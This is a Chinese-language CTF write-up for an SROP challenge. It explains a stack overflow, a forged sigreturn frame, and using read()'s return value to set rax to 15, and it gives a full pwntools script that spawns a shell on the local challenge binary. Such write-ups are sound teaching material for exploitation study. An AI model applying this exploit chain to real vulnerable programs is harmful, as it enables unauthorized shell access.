# SROP

## 题目简述

程序存在栈溢出，并且二进制中同时具备以下条件：

- 可重新进入的 `read` 路径；
- 地址 `0x40100f` 处的 `syscall` 指令；
- 地址 `0x40105a` 处的 `/bin/sh\x00` 字符串；
- 覆盖返回地址所需偏移为 `0x108`。

可用 `read` 的返回值控制 `rax`，先触发 `rt_sigreturn`，让内核从栈上恢复伪造的信号帧，再执行 `execve("/bin/sh", 0, 0)`。

## 解题过程

### SROP 的寄存器目标

AMD64 Linux 中：

```text
rt_sigreturn = 15   = 0x0f
execve       = 59   = 0x3b
```

执行 `syscall` 且 `rax=15` 时，内核把当前 `rsp` 指向的数据当作信号上下文，恢复其中保存的通用寄存器和 `rip`。因此伪造帧应设置：

```text
rax = 59
rdi = 0x40105a       # "/bin/sh\x00"
rsi = 0
rdx = 0
rip = 0x40100f       # syscall
```

恢复完成后会再次执行同一个 `syscall`，此时系统调用号已经变为 `59`，实际调用的就是：

```c
execve("/bin/sh", NULL, NULL);
```

### 用 read 返回值触发 sigreturn

程序缺少直接设置 `rax=15` 的 gadget，但 `read()` 成功时会把实际读取字节数返回到 `rax`。第一阶段栈溢出回到地址 `0x401012` 的读取路径，并把下一跳布置为 `syscall`；随后第二次只发送 `0x0f` 字节，`read` 返回后便得到 `rax=15`。

完整利用脚本如下：

```python
from pwn import *


context.arch = "amd64"

p = process("./pwn")

bin_sh = 0x40105A
syscall = 0x40100F
read_again = 0x401012
offset = 0x108

frame = SigreturnFrame()
frame.rax = 0x3B
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = (
    b"A" * offset
    + p64(read_again)
    + p64(0)          # 适配读取路径的栈布局
    + p64(syscall)
    + bytes(frame)
)

p.send(payload)
p.send(b"A" * 0x0F)  # read 返回 15，使 rax = SYS_rt_sigreturn
p.interactive()
```

两次发送承担不同作用：第一段覆盖返回地址并把伪造帧放到栈上；第二段的内容本身无意义，重要的是长度必须恰好为 `15`。若发送长度不是 `0x0f`，下一次 `syscall` 就不会进入 `rt_sigreturn`。

内核恢复伪造帧后，以 `rax=59`、`rdi=bin_sh` 再次执行 `syscall`，获得 shell；随后读取题目中的 flag 文件即可。

## 方法总结

SROP 适合 gadget 很少、但存在栈溢出和 `syscall` 的小型二进制。它把复杂的逐寄存器 ROP 转化为一次伪造信号上下文：只要能够让 `rax=15` 并让 `rsp` 指向合法的 `SigreturnFrame`，就能一次性控制 `rax`、参数寄存器和 `rip`。

本题的关键细节是利用 `read` 返回值设置系统调用号，而不是寻找 `pop rax; ret`。分析时应逐项确认溢出偏移、二次读取入口、`syscall` 地址、帧在栈上的起始位置以及 `/bin/sh` 地址；第二次写入的 15 字节也必须与第一次 payload 分阶段送达。
